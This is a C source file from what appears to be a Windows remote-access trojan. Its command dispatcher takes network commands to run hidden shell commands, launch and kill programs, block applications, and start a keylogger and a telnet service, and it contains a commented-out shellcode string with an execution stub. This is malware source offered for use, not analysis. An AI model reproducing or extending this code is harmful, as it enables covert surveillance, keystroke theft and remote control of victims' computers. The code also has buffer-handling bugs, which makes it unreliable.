/********************************************************
*  Name:	exec.c
*  Copyright: 	GPL
*  Author: 	marcelusmedius (marcelusmedius@gmail.com)
*  Date: 	31/12/09 00:32
*  Description:	Rotinas para execuação de comandos
********************************************************/
#include "main.h"


char 	argv[MAX_ARGS][MAX_PATH];
int	argc;
//char 	exec_ret[2000] = "123";

char    ret[1000];
extern struct registry_type reg;


void split_args(char *cmd){
	clearBuff(argv);
	int cmd_count = 0;
	int arg_num = 0;
	int arg_char = 0;
	argc = 0;
	
	while(cmd[cmd_count]){
		while((cmd[cmd_count] != ' ') & (strlen(cmd)>=cmd_count)){
			argv[arg_num][arg_char] = cmd[cmd_count];
			//printf("cmd:%d	argc:%d	argn:%d		%c	%c\n",cmd_count,arg_char,arg_num,cmd[cmd_count],argv[arg_num][arg_char]);
			cmd_count++;
			arg_char++;
		}
		//printf("cmd:%d	argc:%d	argn:%d		%c	%c ---\n",cmd_count,arg_char,arg_num,cmd[cmd_count],argv[arg_num][arg_char]);
		cmd_count++;
		arg_num++;
		arg_char = 0;
	}
	argc = arg_num;
        //printf("%s	%s	%s	%s	%s	n:%d\n" ,argv[0], argv[1], argv[2],argv[3],argv[4],argc);
}

void stop(){
	stop_service();
	running(false);
}

void run(char *path){				//exec a program
    PROCESS_INFORMATION piProcessInfo = { 0 };
	STARTUPINFO siStartupInfo = { 0 };
	/* CreateProcess API initialization */

	memset(&siStartupInfo, 0, sizeof(siStartupInfo));
	memset(&piProcessInfo, 0, sizeof(piProcessInfo));
	siStartupInfo.cb = sizeof(siStartupInfo);
        CreateProcess(path,0, 0, 0, false,CREATE_DEFAULT_ERROR_MODE | CREATE_NEW_CONSOLE, 0, 0,&siStartupInfo, &piProcessInfo);
}

char *exec2(char *cmd){				//exec a prompt command
	//printf(cmd);
	char    psBuffer[200];
	clearBuff(ret);
	clearBuff(psBuffer);
	FILE   *chkdsk;
	if( (chkdsk = _popen(cmd, "rt" )) == NULL )
		exit( 1 );
	while( !feof( chkdsk ) )
	{
		if( fgets( psBuffer, 200, chkdsk ) != NULL );
			strcat(ret,psBuffer);
	}
	//printf( "\nProcess returned %d\n", _pclose( chkdsk ) );
        _pclose( chkdsk );
        //printf("exiting");
	return(ret);
}

char exec(char *cmd){				//exec a prompt command
	PROCESS_INFORMATION pi = { 0 };
	STARTUPINFO si = { 0 };
	/* CreateProcess API initialization */

	char param[200];
	char command[MAX_PATH];

        si.cb = sizeof( si );
        si.dwFlags = STARTF_USESTDHANDLES | STARTF_USESHOWWINDOW;
        si.wShowWindow = SW_HIDE;
        //si.hStdOutput =
        //si.hStdError = ( HANDLE )NULL;
        //si.hStdInput = ( HANDLE )NULL;
        GetEnvironmentVariable( "COMSPEC", command, 2000 );
        strcpy(param, " /C ");
        strcat(param, cmd);

	//memset(&si, 0, sizeof(si));
	//memset(&pi, 0, sizeof(pi));
	si.cb = sizeof(si);
	//net_send(buff);
	//printf("%s %s\n",command,param);
        CreateProcess(command,param, 0, 0, false,CREATE_DEFAULT_ERROR_MODE | CREATE_NEW_CONSOLE, 0, 0,&si, &pi);
        //return(exec_ret);
}







void help(){
	net_send("Help\n\r");
	net_send("Command            Description\n\r");
	net_send("-------------------------------------------------\n\r");
	net_send("help               Shows this screen\n\r");
	net_send("msg  xxx           Shows a xxx message box in server\n\r");
	net_send("kill xxx           kill a xxx process\n\r");
	net_send("exit               Stops the server\n\r");
	net_send("mail  xxx          Send a specified message to mail server\n\r");
       	net_send("exec  xxx          Execute a win prompt xxx command\n\r");
       	net_send("block  xxx         Add a xxx app to block list or, without args, show it.\n\r");
       	net_send("unblock            Unblocks all blocked apps\n\r");
       	net_send("keylogger xxx      un/load keylogger with xxx = stop or xxx = start it\n\r");
       	net_send("telnet xxx         un/load telnet with xxx = stop or xxx = start it\n\r");
	net_send("\n\r");
}

void shellcode_run(void *add){
//        //char shellcode[]="\x33\xC0\xB8\x8F\x7A\x83\x7C\x68\x00\x04\x00\x00\x68\x00\x03\x00\x00\xFF\xD0\x33\xC0\xB8\xFA\xCA\x81\x7C\xFF\xD0";
//	void (*routine) ();
//	(long) routine = add;
//	routine();
}

char *my_id(){
	return(reg.id);
}

void cmd_exec(char *cmd){
	split_args(cmd);
	if(!strcmp(argv[0],"help"))help();
	if(!strcmp(argv[0],"exit"))stop();

	if(!strcmp(argv[0],"msg"))msg(cmd + 4);
        if(!strcmp(argv[0],"mail"))net_send(send_mail(cmd + 5));
        //if(!strcmp(argv[0],"exec"))net_send(exec(cmd + 5));
	if(!strcmp(argv[0],"unblock"))net_send(stop_blocking());

	if(!strcmp(argv[0],"block")){
		if(argc > 1){
			net_send(start_blocking(argv[1]));
		}else{
			net_send(block_list());
		}
	}
	
	if(!strcmp(argv[0],"cmd")){
		if(argc > 1){
			//net_send(exec(cmd + 4));
			exec(cmd + 4);
		}
	}
	if(!strcmp(argv[0],"run")){
		if(argc > 1){
			run(cmd + 4);
			net_send(cmd + 4);
		}
	}
	
	if(!strcmp(argv[0],"keylogger")){
		if(!strcmp(argv[1],"start")){
			net_send(start_keylogger());
		}else if(!strcmp(argv[1],"stop")){
			net_send(stop_keylogger());
		}else{
			net_send(is_logging());
		}
	}
	if(!strcmp(argv[0],"telnet")){
		if(!strcmp(argv[1],"start")){
			net_send(start_telnet());
		}else if(!strcmp(argv[1],"stop")){
			net_send(stop_telnet());
		}else{
			net_send(telnet_running());
		}
	}
	if(!strcmp(argv[0],"kill")){
		if(argc > 1) {
			net_send(kill(argv[1]));
		}else{
			net_send("Needed arg\n\r");
		}
	}
	clearBuff(cmd);
}

